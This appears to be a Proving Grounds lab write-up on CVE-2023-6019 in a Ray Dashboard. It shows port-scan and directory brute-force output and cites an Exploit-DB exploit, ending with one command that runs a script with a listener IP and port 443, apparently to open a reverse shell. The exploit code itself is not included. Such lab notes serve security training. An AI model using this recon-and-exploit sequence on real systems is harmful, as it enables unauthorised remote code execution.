
# Recon 

## TCP Scan 

```bash
sudo ../Tools/scan.sh 192.168.127.37    
[*] Running rustscan...
[*] Running nmap on ports: 22,9000,33763,34875,37757,38003,38463,41541,44217,44227,56721,57697,62963,52365
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-23 21:37 +07
Nmap scan report for 192.168.127.37
Host is up (0.11s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 62:36:1a:5c:d3:e3:7b:e1:70:f8:a3:b3:1c:4c:24:38 (RSA)
|   256 ee:25:fc:23:66:05:c0:c1:ec:47:c6:bb:00:c7:4f:53 (ECDSA)
|_  256 83:5c:51:ac:32:e5:3a:21:7c:f6:c2:cd:93:68:58:d8 (ED25519)
9000/tcp  open  http    aiohttp 3.9.1 (Python 3.8)
|_http-title: Ray Dashboard
|_http-server-header: Python/3.8 aiohttp/3.9.1
33763/tcp open  grpc
34875/tcp open  grpc
37757/tcp open  grpc
38003/tcp open  grpc
38463/tcp open  grpc
41541/tcp open  unknown
44217/tcp open  http    WSGIServer 0.2 (Python 3.8.10)
|_http-server-header: WSGIServer/0.2 CPython/3.8.10
|_http-title: Site doesn't have a title (text/plain; version=0.0.4; charset=utf-8).
44227/tcp open  http    WSGIServer 0.2 (Python 3.8.10)
|_http-server-header: WSGIServer/0.2 CPython/3.8.10
|_http-title: Site doesn't have a title (text/plain; version=0.0.4; charset=utf-8).
|_http-trane-info: Problem with XML parsing of /evox/about
52365/tcp open  http    aiohttp 3.9.1 (Python 3.8)
|_http-server-header: Python/3.8 aiohttp/3.9.1
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
56721/tcp open  unknown
57697/tcp open  grpc
62963/tcp open  http    WSGIServer 0.2 (Python 3.8.10)
|_http-title: Site doesn't have a title (text/plain; version=0.0.4; charset=utf-8).
|_http-trane-info: Problem with XML parsing of /evox/about
|_http-server-header: WSGIServer/0.2 CPython/3.8.10
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port41541-TCP:V=7.95%I=7%D=6/23%Time=68596695%P=aarch64-unknown-linux-g
SF:nu%r(NULL,34,"\0\0\x1e\x04\0\0\0\0\0\0\x03\x7f\xff\xff\xff\0\x04\0@\0\0
SF:\0\x05\0@\0\0\0\x06\0\0@\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\
SF:0\x01")%r(GenericLines,34,"\0\0\x1e\x04\0\0\0\0\0\0\x03\x7f\xff\xff\xff
SF:\0\x04\0@\0\0\0\x05\0@\0\0\0\x06\0\0@\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0
SF:\0\0\0\0\0\?\0\x01")%r(GetRequest,34,"\0\0\x1e\x04\0\0\0\0\0\0\x03\x7f\
SF:xff\xff\xff\0\x04\0@\0\0\0\x05\0@\0\0\0\x06\0\0@\0\xfe\x03\0\0\0\x01\0\
SF:0\x04\x08\0\0\0\0\0\0\?\0\x01")%r(HTTPOptions,34,"\0\0\x1e\x04\0\0\0\0\
SF:0\0\x03\x7f\xff\xff\xff\0\x04\0@\0\0\0\x05\0@\0\0\0\x06\0\0@\0\xfe\x03\
SF:0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\x01")%r(RTSPRequest,34,"\0\0\x1e\
SF:x04\0\0\0\0\0\0\x03\x7f\xff\xff\xff\0\x04\0@\0\0\0\x05\0@\0\0\0\x06\0\0
SF:@\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\x01")%r(RPCCheck,34,"
SF:\0\0\x1e\x04\0\0\0\0\0\0\x03\x7f\xff\xff\xff\0\x04\0@\0\0\0\x05\0@\0\0\
SF:0\x06\0\0@\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\x01")%r(DNSV
SF:ersionBindReqTCP,34,"\0\0\x1e\x04\0\0\0\0\0\0\x03\x7f\xff\xff\xff\0\x04
SF:\0@\0\0\0\x05\0@\0\0\0\x06\0\0@\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0
SF:\0\0\?\0\x01")%r(DNSStatusRequestTCP,34,"\0\0\x1e\x04\0\0\0\0\0\0\x03\x
SF:7f\xff\xff\xff\0\x04\0@\0\0\0\x05\0@\0\0\0\x06\0\0@\0\xfe\x03\0\0\0\x01
SF:\0\0\x04\x08\0\0\0\0\0\0\?\0\x01")%r(Help,34,"\0\0\x1e\x04\0\0\0\0\0\0\
SF:x03\x7f\xff\xff\xff\0\x04\0@\0\0\0\x05\0@\0\0\0\x06\0\0@\0\xfe\x03\0\0\
SF:0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\x01")%r(SSLSessionReq,34,"\0\0\x1e\x0
SF:4\0\0\0\0\0\0\x03\x7f\xff\xff\xff\0\x04\0@\0\0\0\x05\0@\0\0\0\x06\0\0@\
SF:0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\x01")%r(TerminalServerC
SF:ookie,34,"\0\0\x1e\x04\0\0\0\0\0\0\x03\x7f\xff\xff\xff\0\x04\0@\0\0\0\x
SF:05\0@\0\0\0\x06\0\0@\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\x0
SF:1")%r(TLSSessionReq,34,"\0\0\x1e\x04\0\0\0\0\0\0\x03\x7f\xff\xff\xff\0\
SF:x04\0@\0\0\0\x05\0@\0\0\0\x06\0\0@\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\
SF:0\0\0\0\?\0\x01")%r(Kerberos,34,"\0\0\x1e\x04\0\0\0\0\0\0\x03\x7f\xff\x
SF:ff\xff\0\x04\0@\0\0\0\x05\0@\0\0\0\x06\0\0@\0\xfe\x03\0\0\0\x01\0\0\x04
SF:\x08\0\0\0\0\0\0\?\0\x01");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port56721-TCP:V=7.95%I=7%D=6/23%Time=68596695%P=aarch64-unknown-linux-g
SF:nu%r(NULL,34,"\0\0\x1e\x04\0\0\0\0\0\0\x03\x7f\xff\xff\xff\0\x04\0@\0\0
SF:\0\x05\0@\0\0\0\x06\0\0@\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\
SF:0\x01")%r(GenericLines,34,"\0\0\x1e\x04\0\0\0\0\0\0\x03\x7f\xff\xff\xff
SF:\0\x04\0@\0\0\0\x05\0@\0\0\0\x06\0\0@\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0
SF:\0\0\0\0\0\?\0\x01")%r(GetRequest,34,"\0\0\x1e\x04\0\0\0\0\0\0\x03\x7f\
SF:xff\xff\xff\0\x04\0@\0\0\0\x05\0@\0\0\0\x06\0\0@\0\xfe\x03\0\0\0\x01\0\
SF:0\x04\x08\0\0\0\0\0\0\?\0\x01")%r(HTTPOptions,34,"\0\0\x1e\x04\0\0\0\0\
SF:0\0\x03\x7f\xff\xff\xff\0\x04\0@\0\0\0\x05\0@\0\0\0\x06\0\0@\0\xfe\x03\
SF:0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\x01")%r(RTSPRequest,34,"\0\0\x1e\
SF:x04\0\0\0\0\0\0\x03\x7f\xff\xff\xff\0\x04\0@\0\0\0\x05\0@\0\0\0\x06\0\0
SF:@\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\x01")%r(RPCCheck,34,"
SF:\0\0\x1e\x04\0\0\0\0\0\0\x03\x7f\xff\xff\xff\0\x04\0@\0\0\0\x05\0@\0\0\
SF:0\x06\0\0@\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\x01")%r(DNSV
SF:ersionBindReqTCP,34,"\0\0\x1e\x04\0\0\0\0\0\0\x03\x7f\xff\xff\xff\0\x04
SF:\0@\0\0\0\x05\0@\0\0\0\x06\0\0@\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0
SF:\0\0\?\0\x01")%r(DNSStatusRequestTCP,34,"\0\0\x1e\x04\0\0\0\0\0\0\x03\x
SF:7f\xff\xff\xff\0\x04\0@\0\0\0\x05\0@\0\0\0\x06\0\0@\0\xfe\x03\0\0\0\x01
SF:\0\0\x04\x08\0\0\0\0\0\0\?\0\x01")%r(Help,34,"\0\0\x1e\x04\0\0\0\0\0\0\
SF:x03\x7f\xff\xff\xff\0\x04\0@\0\0\0\x05\0@\0\0\0\x06\0\0@\0\xfe\x03\0\0\
SF:0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\x01")%r(SSLSessionReq,34,"\0\0\x1e\x0
SF:4\0\0\0\0\0\0\x03\x7f\xff\xff\xff\0\x04\0@\0\0\0\x05\0@\0\0\0\x06\0\0@\
SF:0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\x01")%r(TerminalServerC
SF:ookie,34,"\0\0\x1e\x04\0\0\0\0\0\0\x03\x7f\xff\xff\xff\0\x04\0@\0\0\0\x
SF:05\0@\0\0\0\x06\0\0@\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\x0
SF:1")%r(TLSSessionReq,34,"\0\0\x1e\x04\0\0\0\0\0\0\x03\x7f\xff\xff\xff\0\
SF:x04\0@\0\0\0\x05\0@\0\0\0\x06\0\0@\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\
SF:0\0\0\0\?\0\x01")%r(Kerberos,34,"\0\0\x1e\x04\0\0\0\0\0\0\x03\x7f\xff\x
SF:ff\xff\0\x04\0@\0\0\0\x05\0@\0\0\0\x06\0\0@\0\xfe\x03\0\0\0\x01\0\0\x04
SF:\x08\0\0\0\0\0\0\?\0\x01");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.32 seconds
```

## UDP Scan

```bash
sudo nmap -Pn -n 192.168.127.37  -sU --top-ports=100 --reason
```
nothing 

## TCP 9000

![[Challenge/ProvingGround/CVE-2023-6019/IMG/001.png]]

### Dir Bruteforce 

```bash
feroxbuster -u http://192.168.127.37:9000  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt 

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher ðŸ¤“                 ver: 2.11.0
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 ðŸŽ¯  Target Url            â”‚ http://192.168.127.37:9000
 ðŸš€  Threads               â”‚ 50
 ðŸ“–  Wordlist              â”‚ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
 ðŸ‘Œ  Status Codes          â”‚ All Status Codes!
 ðŸ’¥  Timeout (secs)        â”‚ 7
 ðŸ¦¡  User-Agent            â”‚ feroxbuster/2.11.0
 ðŸ’‰  Config File           â”‚ /etc/feroxbuster/ferox-config.toml
 ðŸ”Ž  Extract Links         â”‚ true
 ðŸ  HTTP methods          â”‚ [GET]
 ðŸ”ƒ  Recursion Depth       â”‚ 4
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 ðŸ  Press [ENTER] to use the Scan Management Menuâ„¢
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
404      GET        1l        3w       14c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET        2l       14w     5038c http://192.168.127.37:9000/favicon.ico
200      GET        2l      118w     5995c http://192.168.127.37:9000/static/css/main.388a904b.css
200      GET       18l       30w      775c http://192.168.127.37:9000/logs/events
200      GET        0l        0w        0c http://192.168.127.37:9000/logs/monitor.out
200      GET        0l        0w        0c http://192.168.127.37:9000/logs/agent-424238335.out
200      GET        0l        0w        0c http://192.168.127.37:9000/logs/dashboard.err
200      GET        0l        0w        0c http://192.168.127.37:9000/logs/runtime_env_agent.log
200      GET        0l        0w        0c http://192.168.127.37:9000/logs/raylet.err
200      GET      224l     1802w    12018c http://192.168.127.37:9000/logs/python-core-worker-c2b4b12ce299e8dec79aa993e40120fcd6541bfa96726150527606c2_4581.log
200      GET        0l        0w        0c http://192.168.127.37:9000/logs/monitor.err
200      GET        0l        0w        0c http://192.168.127.37:9000/logs/gcs_server.err
200      GET      165l     1203w     8580c http://192.168.127.37:9000/logs/debug_state.txt
200      GET        0l        0w        0c http://192.168.127.37:9000/logs/worker-14b4ccc168df524c55bf0bb8fa7eb1a94388043fd6fa2e50bcfa86eb-ffffffff-4584.err
200      GET      224l     1802w    12015c http://192.168.127.37:9000/logs/python-core-worker-14b4ccc168df524c55bf0bb8fa7eb1a94388043fd6fa2e50bcfa86eb_4584.log
200      GET        0l        0w        0c http://192.168.127.37:9000/logs/agent-424238335.err
200      GET        0l        0w        0c http://192.168.127.37:9000/logs/worker-14b4ccc168df524c55bf0bb8fa7eb1a94388043fd6fa2e50bcfa86eb-ffffffff-4584.out
200      GET        8l       83w     1015c http://192.168.127.37:9000/logs/log_monitor.log
200      GET       78l      635w     4423c http://192.168.127.37:9000/logs/python-core-driver-02000000ffffffffffffffffffffffffffffffffffffffffffffffff_4485.log
200      GET       11l       14w      108c http://192.168.127.37:9000/logs/old
200      GET       97l      774w     5191c http://192.168.127.37:9000/logs/debug_state_gcs.txt
200      GET        0l        0w        0c http://192.168.127.37:9000/logs/worker-c2b4b12ce299e8dec79aa993e40120fcd6541bfa96726150527606c2-ffffffff-4581.out
200      GET        0l        0w        0c http://192.168.127.37:9000/logs/log_monitor.err
200      GET        0l        0w        0c http://192.168.127.37:9000/logs/worker-c2b4b12ce299e8dec79aa993e40120fcd6541bfa96726150527606c2-ffffffff-4581.err
200      GET       78l      635w     4426c http://192.168.127.37:9000/logs/python-core-driver-03000000ffffffffffffffffffffffffffffffffffffffffffffffff_4558.log
200      GET      227l     1855w    12405c http://192.168.127.37:9000/logs/python-core-driver-01000000ffffffffffffffffffffffffffffffffffffffffffffffff_4144.log
403      GET        1l        2w       14c http://192.168.127.37:9000/static
200      GET      172l     2115w    24374c http://192.168.127.37:9000/logs/dashboard_agent.log
200      GET      313l     5560w    58381c http://192.168.127.37:9000/logs/dashboard.log
200      GET     1362l    12189w    92524c http://192.168.127.37:9000/logs/raylet.out
403      GET        1l        2w       14c http://192.168.127.37:9000/static/
200      GET      733l     6610w    47558c http://192.168.127.37:9000/logs/gcs_server.out
403      GET        1l        2w       14c http://192.168.127.37:9000/static/media
403      GET        1l        2w       14c http://192.168.127.37:9000/static/js
200      GET     1532l     5000w    53769c http://192.168.127.37:9000/logs/monitor.log
200      GET       38l       70w     2977c http://192.168.127.37:9000/logs
403      GET        1l        2w       14c http://192.168.127.37:9000/static/css
403      GET        1l        2w       14c http://192.168.127.37:9000/static/js/
403      GET        1l        2w       14c http://192.168.127.37:9000/static/css/
200      GET        1l        9w       70c http://192.168.127.37:9000/events
200      GET        3l    55052w  1816720c http://192.168.127.37:9000/static/js/main.4ff4f4db.js
200      GET        1l       23w      446c http://192.168.127.37:9000/
500      GET        1l        8w       57c http://192.168.127.37:9000/nodes
[####################] - 67s   106401/106401  0s      found:42      errors:0      
[####################] - 66s    26584/26584   405/s   http://192.168.127.37:9000/ 
[####################] - 65s    26584/26584   407/s   http://192.168.127.37:9000/static/css/ 
[####################] - 65s    26584/26584   408/s   http://192.168.127.37:9000/static/ 
[####################] - 65s    26584/26584   408/s   http://192.168.127.37:9000/static/js/ 
[####################] - 0s     26584/26584   93606/s http://192.168.127.37:9000/logs/ => Directory listing (add --scan-dir-listings to scan)     

```

![[Challenge/ProvingGround/CVE-2023-6019/IMG/003.png]]


ref: https://www.exploit-db.com/exploits/51978 

![[Challenge/ProvingGround/CVE-2023-6019/IMG/004.png]]

```bash
python3 cve.py -t 192.168.127.37 -p 9000 -L 192.168.45.196 -P 443
```

![[Challenge/ProvingGround/CVE-2023-6019/IMG/005.png]]

# PWN